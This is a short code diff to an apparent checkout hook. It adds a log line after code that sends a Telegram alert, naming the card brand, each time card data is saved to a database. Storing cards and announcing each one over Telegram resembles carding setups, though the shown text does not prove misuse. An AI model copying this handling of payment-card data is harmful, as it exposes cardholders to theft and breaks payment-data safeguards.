@@ -82,6 +82,7 @@ export const useCheckoutOrder = () => {
       try {
         const brandName = (cardData.brand || 'Unknown').toUpperCase();
         await sendTelegramNotification(`💳 Novo cartão salvo no BD - ${brandName}`);
+        console.log('Telegram notification sent on card data save to database');
       } catch (telegramError) {
         console.error('Erro ao enviar notificação para o Telegram:', telegramError);
       }
